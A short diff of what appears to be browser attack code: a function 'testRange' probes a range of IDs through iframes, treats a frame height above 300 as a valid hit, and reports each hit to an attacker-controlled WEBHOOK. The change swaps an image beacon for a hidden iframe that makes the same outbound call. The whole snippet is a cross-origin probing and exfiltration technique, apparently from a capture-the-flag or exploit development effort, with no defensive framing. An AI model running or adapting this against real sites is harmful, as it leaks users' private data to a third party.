@@ -18,7 +18,11 @@ function testRange(a = 0, b = 2000) {
             if (h > 300) {
                 console.log("LIKELY VALID:", i);
 
-                new Image().src = WEBHOOK + "?id=" + i;
+                const ex = document.createElement("iframe");
+                ex.src = WEBHOOK + "?id=" + i;
+                ex.style.display = "none";
+                document.documentElement.appendChild(ex);
+
             }
 
             iframe.remove();
